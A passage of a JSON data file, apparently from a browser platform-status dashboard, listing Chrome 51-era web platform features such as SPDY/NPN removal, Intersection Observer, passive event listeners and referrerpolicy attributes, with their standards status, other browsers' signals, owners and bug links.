      "edge": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "No signals",
          "val": 4
        }
      }
    },
    "summary": "SPDY/3.1 is the experimental application layer protocol that provides performance improvements over HTTP/1.1 by, for example, connection multiplexing and server push.  SPDY/3.1 is superseded by HTTP/2, which was published as an RFC last May.",
    "id": 5711167683035136,
    "resources": {}
  },
  {
    "category": "Network / Connectivity",
    "updated": {
      "when": "2017-06-14 18:29:05.448290",
      "by": "ericbidelman@google.com"
    },
    "name": "Deprecate and remove TLS Next Protocol Negotiation",
    "tags": [
      "npn",
      "tls",
      "spdy"
    ],
    "comments": "",
    "standards": {
      "status": {
        "text": "Editor's draft",
        "val": 4
      },
      "footprint": {
        "val": 4
      },
      "spec": "https://tools.ietf.org/html/draft-agl-tls-nextprotoneg-04",
      "visibility": {
        "text": "Covered as part of a larger article but not on its own",
        "val": 3
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "chrome": {
        "status": {
          "text": "Removed",
          "val": 7,
          "milestone_str": 51
        },
        "owners": [
          "bnc@chromium.org",
          "davidben@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "blink_components": [
          "Blink"
        ],
        "desktop": 51,
        "flag": false,
        "bug": "https://crbug.com/587472",
        "intervention": false
      },
      "opera": {
        "android": 38,
        "desktop": 38
      },
      "edge": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "No signals",
          "val": 4
        }
      }
    },
    "summary": "NPN was the TLS extension used to negotiate SPDY (and, in transition, HTTP/2). During the standardization process, NPN was replaced with ALPN, published as RFC 7301 in July 2014. We intend to remove NPN at the same time as the SPDY removal.",
    "id": 5767920709795840,
    "resources": {}
  },
  {
    "category": "DOM",
    "updated": {
      "when": "2017-06-14 18:29:01.227740",
      "by": "ericbidelman@google.com"
    },
    "name": "Deprecate and remove: 'results' attribute for <input type=search>",
    "tags": [
      "forms",
      "webkit"
    ],
    "comments": "",
    "standards": {
      "status": {
        "text": "No public standards discussion",
        "val": 6
      },
      "footprint": {
        "val": 5
      },
      "visibility": {
        "text": "Only a very small number of web developers will care about",
        "val": 4
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "chrome": {
        "status": {
          "text": "Deprecated",
          "val": 6,
          "milestone_str": 51
        },
        "owners": [
          "tkent@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "webview": 51,
        "blink_components": [
          "Blink"
        ],
        "desktop": 51,
        "flag": false,
        "android": 51,
        "bug": "http://crbug.com/590117",
        "intervention": false
      },
      "opera": {
        "android": 38,
        "desktop": 38
      },
      "edge": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "No signals",
          "val": 4
        }
      }
    },
    "summary": "In Blink, 'results' attribute just adds a magnifier icon to an INPUT field.  It's a cosmetic feature.\r\n\r\nIn desktop Safari, it controls how many submitted queries are shown in a popup opened by clicking the magnifier icon.\r\n\r\nThis is a WebKit-extension, and it seems no one tried to standardize it.\r\n",
    "id": 5738199536107520,
    "resources": {
      "docs": [
        "https://developer.apple.com/library/iad/documentation/AppleApplications/Reference/SafariHTMLRef/Articles/Attributes.html#//apple_ref/doc/uid/TP40008058-results",
        ""
      ]
    }
  },
  {
    "category": "JavaScript",
    "updated": {
      "when": "2017-06-14 18:28:36.657520",
      "by": "ericbidelman@google.com"
    },
    "name": "ES2015 RegExp subclassing semantics",
    "comments": "",
    "standards": {
      "status": {
        "text": "Editor's draft",
        "val": 4
      },
      "footprint": {
        "val": 4
      },
      "visibility": {
        "text": "So small it doesn't need to be covered in this dashboard.",
        "val": 5
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "text": "In development",
          "val": 2
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 51
        },
        "owners": [
          "littledan@chromium.org",
          "adamk@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "webview": 51,
        "blink_components": [
          "Blink"
        ],
        "desktop": 51,
        "flag": false,
        "android": 51,
        "bug": "https://bugs.chromium.org/p/v8/issues/detail?id=4602",
        "intervention": false
      },
      "opera": {
        "android": 38,
        "desktop": 38
      },
      "edge": {
        "view": {
          "text": "In development",
          "val": 2
        }
      },
      "safari": {
        "view": {
          "text": "In development",
          "val": 2
        }
      },
      "webdev": {
        "view": {
          "text": "No signals",
          "val": 4
        }
      }
    },
    "summary": "This feature allows RegExp subclasses to override RegExp.prototype.exec and flags to change the semantics of higher-level functionality, such as String.prototype.replace. Previous JavaScript versions always used the original value of exec from replace. This feature makes it easier to implement new RegExp subclasses by changing a single core piece, without duplicating the higher level integration logic.",
    "id": 5133084412346368,
    "resources": {}
  },
  {
    "category": "Service Worker",
    "updated": {
      "when": "2018-03-28 21:23:48.752690",
      "by": "ericbidelman@google.com"
    },
    "name": "ExtendableMessageEvent on ServiceWorkerGlobalScope",
    "comments": "",
    "standards": {
      "status": {
        "text": "Working draft or equivalent",
        "val": 3
      },
      "footprint": {
        "val": 4
      },
      "spec": "https://slightlyoff.github.io/ServiceWorker/spec/service_worker/index.html#extendablemessage-event-section",
      "visibility": {
        "text": "Covered as part of a larger article but not on its own",
        "val": 3
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "text": "Shipped",
          "val": 1
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 51
        },
        "owners": [
          "nhiroki@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "blink_components": [
          "Blink>ServiceWorker"
        ],
        "desktop": 51,
        "flag": false,
        "android": 51,
        "bug": "https://code.google.com/p/chromium/issues/detail?id=598608",
        "intervention": false
      },
      "opera": {
        "android": 38,
        "desktop": 38
      },
      "edge": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "No signals",
          "val": 4
        }
      }
    },
    "summary": "ServiceWorker.postMessage() now results in an ExtendableMessageEvent fired on ServiceWorkerGlobalScope as a 'message' event. ExtendableMessageEvent.waitUntil() extends its lifetime until a passed Promise is settled. Before this change, postMessage() resulted in a MessageEvent fired on the global scope.",
    "id": 5724079160033280,
    "resources": {
      "docs": [
        "https://developer.mozilla.org/en-US/docs/Web/API/ExtendableMessageEvent"
      ],
      "samples": [
        "https://googlechrome.github.io/samples/service-worker/post-message/index.html"
      ]
    }
  },
  {
    "category": "JavaScript",
    "updated": {
      "when": "2017-06-14 18:28:36.773020",
      "by": "ericbidelman@google.com"
    },
    "name": "Function \"name\" property (ES6)",
    "comments": "",
    "standards": {
      "status": {
        "text": "Established standard",
        "val": 2
      },
      "footprint": {
        "val": 4
      },
      "spec": "http://tc39.github.io/ecma262/#sec-setfunctionname",
      "visibility": {
        "text": "Only a very small number of web developers will care about",
        "val": 4
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "text": "In development",
          "val": 2
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 51
        },
        "owners": [
          "adamk@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "webview": 51,
        "blink_components": [
          "Blink"
        ],
        "desktop": 51,
        "flag": false,
        "android": 51,
        "bug": "https://bugs.chromium.org/p/v8/issues/detail?id=3699",
        "intervention": false
      },
      "opera": {
        "android": 38,
        "desktop": 38
      },
      "edge": {
        "view": {
          "text": "Shipped",
          "val": 1
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "No signals",
          "val": 4
        }
      }
    },
    "summary": "In ECMAScript 2015, the \"name\" property on anonymous Function objects is sometimes set based on the syntactic position of the function (or class) expression. For example:\r\n\r\nvar x = function() { };\r\nx.name === 'x'",
    "id": 5135002249461760,
    "resources": {}
  },
  {
    "category": "Performance",
    "updated": {
      "when": "2017-12-13 18:40:05.973300",
      "by": "ericbidelman@google.com"
    },
    "name": "Intersection Observer",
    "tags": [
      "intersection",
      "observer"
    ],
    "comments": "",
    "standards": {
      "status": {
        "text": "Working draft or equivalent",
        "val": 3
      },
      "footprint": {
        "val": 2
      },
      "spec": "https://w3c.github.io/IntersectionObserver/",
      "visibility": {
        "text": "Will this feature generate articles on sites like html5rocks.com",
        "val": 2
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1243846",
          "text": "Shipped",
          "val": 1
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 51
        },
        "owners": [
          "mpb@chromium.org",
          "ojan@chromium.org",
          "szager@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "webview": 51,
        "blink_components": [
          "Blink>Layout"
        ],
        "desktop": 51,
        "flag": false,
        "android": 51,
        "bug": "https://crbug.com/540528",
        "intervention": false
      },
      "opera": {
        "android": 38,
        "desktop": 38
      },
      "edge": {
        "view": {
          "url": "https://status.modern.ie/intersectionobserver",
          "text": "Shipped",
          "val": 1
        }
      },
      "safari": {
        "view": {
          "url": "https://bugs.webkit.org/show_bug.cgi?id=159475",
          "text": "In development",
          "val": 2
        }
      },
      "webdev": {
        "view": {
          "text": "Positive",
          "val": 2
        }
      }
    },
    "summary": "The Intersection Observer API can be used to asynchronously observe changes in the intersection of a target Element with an ancestor element (for infinite scrolling lists) or the top-level document's viewport (for 'viewability' tracking).",
    "id": 5695342691483648,
    "resources": {
      "docs": [
        "https://github.com/WICG/IntersectionObserver/blob/gh-pages/explainer.md",
        "https://developer.mozilla.org/en-US/docs/Web/API/Intersection_Observer_API"
      ]
    }
  },
  {
    "category": "JavaScript",
    "updated": {
      "when": "2017-06-14 18:29:03.096120",
      "by": "ericbidelman@google.com"
    },
    "name": "Iterable Array-like DOM interfaces",
    "tags": [
      "ES6"
    ],
    "comments": "",
    "standards": {
      "status": {
        "text": "Working draft or equivalent",
        "val": 3
      },
      "footprint": {
        "val": 3
      },
      "spec": "http://heycam.github.io/webidl/#es-iterators",
      "visibility": {
        "text": "Covered as part of a larger article but not on its own",
        "val": 3
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 51
        },
        "owners": [
          "caitp@igalia.com"
        ],
        "prefixed": false,
        "origintrial": false,
        "blink_components": [
          "Blink"
        ],
        "desktop": 51,
        "flag": false,
        "android": 51,
        "bug": "https://bugs.chromium.org/p/chromium/issues/detail?id=538558",
        "intervention": false
      },
      "opera": {
        "android": 51,
        "desktop": 51
      },
      "edge": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "No signals",
          "val": 4
        }
      }
    },
    "summary": "Adds `Symbol.iterator` to any DOM interface containing an indexed property getter, and a \"length\" property, such as HTMLAllCollection, FileList or MediaList.\r\n\r\nThis enables their use in ECMAScript 6 for-of loops.\r\n",
    "id": 5750902036103168,
    "resources": {}
  },
  {
    "category": "DOM",
    "updated": {
      "when": "2017-06-14 18:28:54.134270",
      "by": "ericbidelman@google.com"
    },
    "name": "Iterable NodeList",
    "tags": [
      "NodeList",
      "Iterable",
      "@@iterator"
    ],
    "comments": "In Safari 10, Firefox 50, Chrome 51, Opera 38. ",
    "standards": {
      "status": {
        "text": "Established standard",
        "val": 2
      },
      "footprint": {
        "val": 3
      },
      "spec": "https://www.w3.org/TR/dom/#interface-nodelist",
      "visibility": {
        "text": "Covered as part of a larger article but not on its own",
        "val": 3
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "url": "https://developer.mozilla.org/en-US/Firefox/Releases/50",
          "text": "Shipped",
          "val": 1
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 51
        },
        "owners": [
          "caitp@igalia.com"
        ],
        "prefixed": false,
        "origintrial": false,
        "webview": 51,
        "blink_components": [
          "Blink"
        ],
        "desktop": 51,
        "flag": false,
        "android": 51,
        "bug": "https://bugs.chromium.org/p/chromium/issues/detail?id=401699",
        "intervention": false
      },
      "opera": {
        "android": 38,
        "desktop": 38
      },
      "edge": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "safari": {
        "view": {
          "url": "http://trac.webkit.org/changeset/200619/webkit",
          "text": "Shipped",
          "val": 1
        }
      },
      "webdev": {
        "view": {
          "text": "Strongly positive",
          "val": 1
        }
      }
    },
    "summary": "Add Symbol.iterator method to NodeList, as well as methods `keys()`, `values()`, `entries()` and `forEach()`.\r\n\r\nThis will allow NodeList to be traversed via ES6 iteration statements: \r\n\r\n    for (let node of document.querySelectorAll('.my-class') { ... }\r\n    \r\n... or via \r\n\r\n    document.querySelectorAll('.my-class').forEach(node => { ... }\r\n",
    "id": 5691608351637504,
    "resources": {
      "docs": [
        "https://dom.spec.whatwg.org/#interface-nodelist"
      ]
    }
  },
  {
    "category": "Realtime / Communication",
    "updated": {
      "when": "2017-06-14 18:28:31.925360",
      "by": "ericbidelman@google.com"
    },
    "name": "Media Capture from Canvas",
    "tags": [
      "canvas",
      "media stream"
    ],
    "comments": "",
    "standards": {
      "status": {
        "text": "Working draft or equivalent",
        "val": 3
      },
      "footprint": {
        "val": 1
      },
      "spec": "http://w3c.github.io/mediacapture-fromelement/",
      "visibility": {
        "text": "Only a very small number of web developers will care about",
        "val": 4
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "url": "https://developer.mozilla.org/en-US/docs/Web/API/HTMLCanvasElement/captureStream",
          "text": "In development",
          "val": 2
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 51
        },
        "owners": [
          "emircan@chromium.org",
          "niklase@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "webview": 51,
        "blink_components": [
          "Blink"
        ],
        "desktop": 51,
        "flag": false,
        "android": 51,
        "bug": "https://crbug.com/524218",
        "intervention": false
      },
      "opera": {
        "android": 36,
        "desktop": 36
      },
      "edge": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "Positive",
          "val": 2
        }
      }
    },
    "summary": "“Media Capture from DOM Elements” document by W3C defines captureStream() method that allows the capture of the <canvas> element in the form of a MediaStream. We want to implement the necessary Blink and Chromium sections that would create this stream by accessing the canvas output according to the given frame rate constraints.",
    "id": 4817998447640576,
    "resources": {
      "docs": [
        "https://goo.gl/BFJY52"
      ],
      "samples": [
        "https://webrtc.github.io/samples/src/content/capture/canvas-pc/"
      ]
    }
  },
  {
    "category": "DOM",
    "updated": {
      "when": "2017-06-14 18:29:02.264970",
      "by": "ericbidelman@google.com"
    },
    "name": "Non-standard contenteditable=plaintext-only limits white-space CSS property",
    "tags": [
      "html",
      "editing"
    ],
    "comments": "",
    "standards": {
      "status": {
        "text": "Public discussion",
        "val": 5
      },
      "footprint": {
        "val": 4
      },
      "visibility": {
        "text": "Only a very small number of web developers will care about",
        "val": 4
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 51
        },
        "owners": [
          "tkent@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "blink_components": [
          "Blink"
        ],
        "desktop": 51,
        "flag": false,
        "android": 51,
        "webview": 51,
        "intervention": false
      },
      "opera": {
        "android": 38,
        "desktop": 38
      },
      "edge": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "No signals",
          "val": 4
        }
      }
    },
    "summary": "Blink supports plaintext-only editing mode by contenteditable=plaintext-only and -webkit-user-modify:read-write-plaintext-only.  This is a non-standard feature inherited from WebKit.\r\n\r\nAn element with plaintext-only editing silently changes white-space CSS property:\r\nnormal to pre-wrap, nowrap to pre, pre-line to pre-wrap,\r\n\r\nin order to\r\ninsert \\n by typing Enter key instead of <br>, and\r\ninsert a space character by typing a space key instead of &nbsp;\r\n",
    "id": 5743696054059008,
    "resources": {}
  },
  {
    "category": "JavaScript",
    "updated": {
      "when": "2017-06-14 18:28:49.950120",
      "by": "ericbidelman@google.com"
    },
    "name": "Object.getOwnPropertyDescriptors()",
    "tags": [
      "es6",
      "es7",
      "esnext",
      "getOwnPropertyDescriptor",
      "js",
      "typescript",
      "lodash"
    ],
    "comments": "",
    "standards": {
      "status": {
        "text": "Working draft or equivalent",
        "val": 3
      },
      "footprint": {
        "val": 3
      },
      "spec": "https://tc39.github.io/ecma262/#sec-object.getownpropertydescriptors",
      "visibility": {
        "text": "Covered as part of a larger article but not on its own",
        "val": 3
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1279303",
          "text": "In development",
          "val": 2
        }
      },
      "chrome": {
        "status": {
          "text": "Behind a flag",
          "val": 4,
          "milestone_str": 51
        },
        "owners": [
          "caitp@igalia.com"
        ],
        "prefixed": false,
        "origintrial": false,
        "blink_components": [
          "Blink"
        ],
        "desktop": 51,
        "flag": true,
        "android": 51,
        "bug": "https://bugs.chromium.org/p/v8/issues/detail?id=4725",
        "intervention": false
      },
      "opera": {
        "android": 51,
        "desktop": 51
      },
      "edge": {
        "view": {
          "url": "https://github.com/Microsoft/ChakraCore/pull/1345",
          "text": "In development",
          "val": 2
        }
      },
      "safari": {
        "view": {
          "url": "https://bugs.webkit.org/show_bug.cgi?id=159409",
          "text": "In development",
          "val": 2
        }
      },
      "webdev": {
        "view": {
          "text": "No signals",
          "val": 4
        }
      }
    },
    "summary": "Retrieve all own PropertyDescriptors from an object, which could be used by Object.create() or Object.defineProperties().",
    "id": 5666580386021376,
    "resources": {
      "samples": [
        "http://www.2ality.com/2016/02/object-getownpropertydescriptors.html"
      ]
    }
  },
  {
    "category": "Misc",
    "updated": {
      "when": "2017-06-14 18:29:13.215640",
      "by": "ericbidelman@google.com"
    },
    "name": "Origin Trials Framework",
    "tags": [
      "origin trials",
      "trials",
      "experiment",
      "experiments",
      "framework"
    ],
    "comments": "The motivation for this framework is best captured in the blog post \"Doing Science On The Web\" (https://infrequently.org/2015/08/doing-science-on-the-web/).  This framework is intended to enable incompatible web features to be delivered in a non-web-breaking manner.",
    "standards": {
      "status": {
        "text": "Public discussion",
        "val": 5
      },
      "footprint": {
        "val": 2
      },
      "visibility": {
        "text": "Will this feature generate articles on sites like html5rocks.com",
        "val": 2
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 51
        },
        "owners": [
          "chasej@chromium.org",
          "owencm@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "blink_components": [
          "Blink"
        ],
        "desktop": 51,
        "flag": false,
        "android": 51,
        "bug": "https://code.google.com/p/chromium/issues/detail?id=538593",
        "intervention": false
      },
      "opera": {},
      "edge": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "No signals",
          "val": 4
        }
      }
    },
    "summary": "Implement a framework for exposing experimental features in the browser, but only to specific/registered origins, for limited duration and subject to global usage caps.",
    "id": 6331324939894784,
    "resources": {
      "docs": [
        "https://github.com/jpchase/OriginTrials/blob/gh-pages/explainer.md",
        "https://docs.google.com/document/d/1qVP2CK1lbfmtIJRIm6nwuEFFhGhYbtThLQPo3CSTtmg/edit?usp=sharing"
      ]
    }
  },
  {
    "category": "User input",
    "updated": {
      "when": "2017-06-14 18:29:02.509160",
      "by": "ericbidelman@google.com"
    },
    "name": "Passive event listeners",
    "tags": [
      "passive",
      "EventListenerOptions"
    ],
    "comments": "",
    "standards": {
      "status": {
        "text": "Editor's draft",
        "val": 4
      },
      "footprint": {
        "val": 4
      },
      "spec": "https://dom.spec.whatwg.org/#dom-eventlisteneroptions-passive",
      "visibility": {
        "text": "Likely in mainstream tech news",
        "val": 1
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "url": "https://platform-status.mozilla.org/#passive-event-listeners",
          "text": "Shipped",
          "val": 1
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 51
        },
        "owners": [
          "dtapuska@chromium.org",
          "rbyers@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "webview": 51,
        "ios": 51,
        "blink_components": [
          "Blink"
        ],
        "desktop": 51,
        "flag": false,
        "android": 51,
        "bug": "http://crbug.com/489802",
        "intervention": false
      },
      "opera": {
        "android": 38,
        "desktop": 38
      },
      "edge": {
        "view": {
          "url": "https://github.com/WICG/EventListenerOptions/issues/12#issuecomment-207501917",
          "text": "Mixed public signals",
          "val": 4
        }
      },
      "safari": {
        "view": {
          "url": "https://trac.webkit.org/changeset/201757",
          "text": "Shipped",
          "val": 1
        }
      },
      "webdev": {
        "view": {
          "text": "Positive",
          "val": 2
        }
      }
    },
    "summary": "Expose \"passive\" boolean in the EventListenerOptions dictionary.\r\n\r\nImplement the behaviour with respect to dispatching passive EventListeners so that calling preventDefault inside executing the passive registered callback only generates a warning to the console.  Can be used to dramatically improve scrolling performance.",
    "id": 5745543795965952,
    "resources": {
      "docs": [
        "https://github.com/RByers/EventListenerOptions/blob/gh-pages/explainer.md",
        ""
      ],
      "samples": [
        "https://rbyers.github.io/scroll-latency.html"
      ]
    }
  },
  {
    "category": "Device",
    "updated": {
      "when": "2018-05-03 21:44:06.912600",
      "by": "jmedley@google.com"
    },
    "name": "Presentation API",
    "tags": [
      "presentation",
      "cast"
    ],
    "comments": "",
    "standards": {
      "status": {
        "text": "Working draft or equivalent",
        "val": 3
      },
      "footprint": {
        "val": 2
      },
      "spec": "http://w3c.github.io/presentation-api/",
      "visibility": {
        "text": "Will this feature generate articles on sites like html5rocks.com",
        "val": 2
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1192101",
          "text": "In development",
          "val": 2
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 51
        },
        "owners": [
          "avayvod@chromium.org",
          "mfoltz@chromium.org",
          "mlamouri@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "blink_components": [
          "Blink"
        ],
        "desktop": 51,
        "flag": false,
        "android": 48,
        "bug": "https://code.google.com/p/chromium/issues/detail?id=412331",
        "intervention": false
      },
      "opera": {},
      "edge": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "safari": {
        "view": {
          "url": "https://bugs.webkit.org/show_bug.cgi?id=149141",
          "text": "Mixed public signals",
          "val": 4
        }
      },
      "webdev": {
        "view": {
          "text": "No signals",
          "val": 4
        }
      }
    },
    "summary": "Gives ability to access external presentation-type displays and use them for presenting web content.",
    "id": 6676265876586496,
    "resources": {
      "docs": [
        "https://developer.mozilla.org/en-US/docs/Web/API/Presentation_API"
      ],
      "samples": [
        "https://googlechrome.github.io/samples/presentation-api/",
        "https://googlechromelabs.github.io/presentation-api-samples/photowall/"
      ]
    }
  },
  {
    "category": "Realtime / Communication",
    "updated": {
      "when": "2017-06-14 18:29:02.132720",
      "by": "ericbidelman@google.com"
    },
    "name": "RTCPeerConnection promise-based methods",
    "comments": "Also this ticket: https://crbug.com582914, ",
    "standards": {
      "status": {
        "text": "Working draft or equivalent",
        "val": 3
      },
      "footprint": {
        "val": 2
      },
      "spec": "https://w3c.github.io/webrtc-pc/",
      "visibility": {
        "text": "Will this feature generate articles on sites like html5rocks.com",
        "val": 2
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "text": "Shipped",
          "val": 1
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 51
        },
        "owners": [
          "guidou@chromium.org",
          "hta@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "webview": 51,
        "blink_components": [
          "Blink"
        ],
        "desktop": 51,
        "flag": false,
        "android": 51,
        "bug": "https://crbug.com/582920",
        "intervention": false
      },
      "opera": {
        "android": 38,
        "desktop": 38
      },
      "edge": {
        "view": {
          "text": "Public support",
          "val": 3
        }
      },
      "safari": {
        "view": {
          "text": "In development",
          "val": 2
        }
      },
      "webdev": {
        "view": {
          "text": "Positive",
          "val": 2
        }
      }
    },
    "summary": "Add promise-based versions of RTCPeerConnection methods: setLocalDescription, setRemoteDescription, addIceCandidate, createOffer and createAnswer.\r\n\r\nTo be done in 2 steps. First, setLocalDescription, setRemoteDescription and addIceCandidate (anticipated in M50). The new versions of these don't have any overloading issues that can cause problems to existing code. For createOffer and createAnswer the overloading issues will be solved before adding the promised-based versions (anticipated in M51).",
    "id": 5743313768415232,
    "resources": {
      "samples": [
        "https://webrtc.github.io/samples/"
      ]
    }
  },
  {
    "category": "Security",
    "updated": {
      "when": "2017-06-14 18:29:02.325890",
      "by": "ericbidelman@google.com"
    },
    "name": "Referrer Policy - HTML referrerpolicy attribute",
    "tags": [
      "referrer policy",
      "referrer",
      "html",
      "dom",
      "attribute",
      "privacy",
      "w3c"
    ],
    "comments": "",
    "standards": {
      "status": {
        "text": "Working draft or equivalent",
        "val": 3
      },
      "footprint": {
        "val": 3
      },
      "spec": "https://w3c.github.io/webappsec/specs/referrer-policy/#referrer-policy-delivery-referrer-attribute",
      "visibility": {
        "text": "Only a very small number of web developers will care about",
        "val": 4
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 51
        },
        "owners": [
          "burnik@chromium.org",
          "estark@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "webview": 51,
        "blink_components": [
          "Blink"
        ],
        "desktop": 51,
        "flag": false,
        "android": 51,
        "bug": "http://crbug.com/490608",
        "intervention": false
      },
      "opera": {
        "android": 38,
        "desktop": 38
      },
      "edge": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "No signals",
          "val": 4
        }
      }
    },
    "summary": "Support for the HTML referrerpolicy attribute on elements: <a>, <area>, <img>, <iframe> (and possibly others) allowing authors to set a Referrer-Policy for a single request associated with the HTML element referencing a sub-resource. More details are disclosed in the spec.",
    "id": 5743723954569216,
    "resources": {
      "docs": [
        "https://goo.gl/aMFGRY",
        "https://developer.mozilla.org/en-US/docs/Web/HTML/Element/a",
        "https://developer.mozilla.org/en-US/docs/Web/HTML/Element/img",
        "https://developer.mozilla.org/en-US/docs/Web/HTML/Element/iframe",
        "https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers",
        "https://developer.mozilla.org/en-US/docs/Web/HTTP/Content_negotiation",
        "https://developer.mozilla.org/en-US/docs/Web/HTML/Element/meta"
      ]
    }
  },
  {
    "category": "Security",
    "updated": {
      "when": "2017-06-14 18:29:02.606460",
      "by": "ericbidelman@google.com"
    },
    "name": "ReferrerPolicy: HTMLLinkElement referrerpolicy attribute",
    "tags": [
      "referrer policy",
      "referrer",
      "html",
      "dom",
      "attribute",
      "privacy",
      "w3c"
    ],
    "comments": "",
    "standards": {
      "status": {
        "text": "Working draft or equivalent",
        "val": 3
      },
      "footprint": {
        "val": 3
      },
      "spec": "https://w3c.github.io/webappsec/specs/referrer-policy/#referrer-policy-delivery-referrer-attribute",
      "visibility": {
        "text": "Only a very small number of web developers will care about",
        "val": 4
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 51
        },
        "owners": [
          "yoav@yoav.ws"
        ],
        "prefixed": false,
        "origintrial": false,
        "webview": 51,
        "blink_components": [
          "Blink"
        ],
        "desktop": 51,
        "flag": false,
        "android": 51,
        "bug": "https://crbug.com/595099",
        "intervention": false
      },
      "opera": {
        "android": 38,
        "desktop": 38
      },
      "edge": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "No signals",
          "val": 4
        }
      }
    },
    "summary": "Support for the HTML referrerpolicy attribute on < link> elements allowing authors to set a Referrer-Policy for a single request associated with the HTML element referencing a sub-resource. More details are disclosed in the spec.",
    "id": 5746489284362240,
    "resources": {
      "docs": [
        "https://developer.mozilla.org/en-US/docs/Web/API/HTMLLinkElement/referrerPolicy",
        "https://developer.mozilla.org/en-US/docs/Web/HTML/Element/link"
      ]
    }
  },
  {
    "category": "User input",
    "updated": {
      "when": "2017-06-14 18:28:52.090710",
      "by": "ericbidelman@google.com"
    },
    "name": "Remove propagation of mouse wheel events to parent iframe.",
    "tags": [
      "WheelEvent",
      "MouseWheelEvent"
    ],
